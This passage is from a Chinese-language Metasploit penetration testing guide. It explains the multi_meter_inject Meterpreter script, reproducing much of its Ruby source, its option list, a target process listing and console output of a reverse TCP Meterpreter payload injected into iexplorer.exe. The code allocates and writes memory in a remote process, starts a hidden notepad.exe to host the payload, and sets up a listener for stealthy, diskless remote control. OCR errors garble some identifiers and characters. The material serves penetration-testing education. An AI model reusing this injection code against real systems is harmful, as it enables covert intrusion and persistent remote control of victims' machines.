sploit
ProvideMultiplePIDforconnectionsseparatedbycomma oneper IP.
-mr ③
Provide Multiple IP Addresses for Connections separated by comma.
The port on the remote host where Metasploit is listening (default: 4444)
-pt
SpecifyReverse Connection Meterpreter Payload.Default windows/
meterpreter/reverse_tcp
meterpreter>
第-一个选项是-m标识符0，该选项自动建立一个新的监听器，来处理返回的连接。如果使
用同一端口（例如443端口），就不需要配置这个选项，接下来，需要确定进程的PID号?，
我们需要将shell注入到进程中。
而只让Meterpreter在内存中运行。当选择某个进程之后，我们会将Meterpreter注入到该进
程的内存空间中继续执行，这将使我们的操作非常隐蔽，不会对硬盘进行任何的写操作，而最
终维持多个可用的shell控制会话。
接下来，我们需要配置攻击机希望Meterpreter会话连接的IP地址和端口O。
在Meterpreter中使用ps命令可得到所有存在的进程列表：
meterpreter>ps
Process list
PID
Name
Arch Session User
Path
0
[System Process]
4
System
256
smss.exe
364
csrss.exe
412
wininit.exe
424
csrss.exe
472
winlogon.exe
516
services.exe
524
lsass.exe
532
lsm.exe
2808
iexplorer.exe 0
x86
meterpreter>
236
---
## Page 264
第16章Meterpreter脚本编程
我们将新的Meterpretershell注入到iexplorer.exeO进程中，这样将产生另一个完全在内存
中运行的全新的Meterpreter控制台，而不会写任何数据到硬盘上。
让我们使用之前看到的一些选项运行multi_meter_inject命令，并查看它是否正常工作：
[*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443
[*]Injecting meterpreterintoprocessID2808
[*]Allocated memory at address 0x03180000, for 290 byte stager
[*] writing the stager into memory...
[*] Sending stage (749056 bytes） to 172.16.32.170
[+]Successfully injected Meterpreter in to process: 2808
0[*]Meterpreter session 3opened(172.16.32.129:443 ->172.16.32.170:1098)at
TueNov3022:37:29-0500 2010
meterpreter>
从输出可以看出，我们的命令成功执行了，一个新的Meterpreter会话出现了，如O所示。
部分，这将帮助我们更好地分析源码，进而了解整个结构。
首先第一部分是一些变量和函数的定义，以及我们想要传递给Meterpreter的命令行选项：
#$Id:multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $
# $Revision:10901 $
#Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-
##################VariableDeclarations##################
@client
=client
lhost
=Rex::Socket.source_address("1.2.3.4")
lport
=4444
lhost
="127.0.0.1"
① pid = nil
multi_ip =nil
multi_pid =[]
payload_type="windows/meterpreter/reverse_tcp"
start_handler= nil
 @exec_opts = Rex::Parser::Arguments.new(
"-h"=>[false，
"Help menu." ],
"-p" => [ true,
"The port on_the remote host where Metasploit is
listening (default: 4444)"],
"-m" => [ false, "Start Exploit multi/handler for return connection"],
"-pt" => [ true,
"Specify Reverse Connection Meterpreter Payload.
Default windows/meterpreter/reverse_tcp"],
"-mr"=>[true,
"Provide Multiple IP Addresses for Connections
separated by comma."],
"-mp"=>[true，
"Provide Multiple PID for connections separated by
comma one per Ip."]
meter_type=client.platform
237
---
## Page 265
Metasploit渗透测试指南
在脚本的初始部分，注意到一些变量为后面的使用做好了定义。例如：pid=nil①创建了一-
个PID变量，但是这个变量还没有赋值。@exec_opts=Rex::Parser::Arguments.new?给出了将
要使用的命令行选项的额外帮助信息。
下一部分定义了我们将要调用的函数：
##################FunctionDeclarations##################
# Usage Message Function
0defusage
print_line“Meterpreter Script for injecting a reverse tcp Meterpreter Payload"
print_line “"in to memory of multiple PID's, if none is provided a notepad process."
print_line "will be created and a Meterpreter Payload will be injected in to each."
print_line(@exec_opts.usage)
raise Rex::Script::Completed
end
#Wrong Meterpreter Version Message Function
#-
def wrong_meter_version(meter = meter_type)
print_error("#{meter} version of Meterpreter is not supported with this Script!")
raise Rex::Script::Completed
end
#Function for injecting payload in to a given PID
definject(target_pid,payload_to_inject)
print_status("Injecting meterpreter into process ID #{target_pid}")
begin
host_process = @client.sys.process.open(target_pid.to_i,PROCESS_ALL_ACCESS
raw = payload_to_inject.generate
③mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
print_status("Allocated memory at address #{"ox%.8x"%mem},for
#{raw.length} byte stager")
print_status("writing the stager into memory...")
Ohost_process.memory.write(mem,raw)
host_process.thread.create(mem, 0)
rescue::Exception =>e
print_error("Failed to Inject Payload to #{target_pid}!")
print_error(e)
end
end
在本例中，usage函数·将在-h命令行选项设置后被调用。你可从MeterpreterAPI中直接调
用一些Meterpreter函数，该功能简化了一些特定任务的实现，例如使用definject函数注入到一
个新进程中去9。
另-个非常重要的元素是host_process.memory.allocate函数调用③，该函数允许我们为
Meterpreter攻击载荷分配内存空间。之后调用host_process.memory.write函数·将内存写入到选
238
---
## Page 266
第16章Meterpreter脚本编程
择的进程空间中，同时调用host_process.thread.create创建-一个新的线程。
下一步，我们定义一个多句柄监听器来处理我们选择的反向攻击载荷，在下面的输出中用
黑体字显示（默认使用Meterpreter，所以除非进行特殊指定，多句柄监听器将处理Meterpreter
会话）。
#Function for creation of connection handler
#-
def create_multi_handler(payload_to_inject)
mul = @client.framework.exploits.create("multi/handler")
mul.share_datastore(payload_to_inject.datastore)
mul.datastore['woRKSPACE']=@client.workspace
mul.datastore['PAYLOAD'] = payload_to_inject
mul.datastore['EXITFUNC']=‘process'
mul.datastore['ExitOnSession']=true
print_status("Running payload handler")
mul.exploit_simple(
'Payload’ => mul.datastore['PAYLOAD'],
'RunAsJob'=> true
）
end
Metasploit框架中创建一个攻击载荷，因为我们知道这是一个Meterpreter攻击载荷，Metasploit
将会为我们自动创建：
#Function for Creating the Payload
def create_payload(payload_type,lhost,lport)
print_status("Creating a reverse meterpreter stager:LHOST=#{lhost} LPORT=#{lport}")
payload = payload_type
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST']= lhost
pay.datastore['LPORT']- lport
return pay
end
下一选项默认生成一个记事本程序进程，如果我们没有指定进程，系统会自动创建出一个
记事本进程。
#Function that starts thenotepad.exeprocess
def start_proc()
print_good("Starting Notepad.exe to house Meterpreter Session.")
proc= client.sys.process.execute('notepad.exe'，nil,{'Hidden′=> true })
print_good("Process created with pid #{proc.pid}")
return proc.pid
end
239
---
## Page 267
Metasploit渗透测试指南
加粗显示的调用允许在目标系统上执行任何命令。注意到Hidden（隐藏）选项设置为真，
示出窗口，它的运行将不会被目标用户所察觉。
然后调用上面编写的函数，如果不符合if语句条件则抛出异常，接着启动攻击载荷。
#################Main##################
@exec_opts.parse(args) {lopt, idx, val|
case opt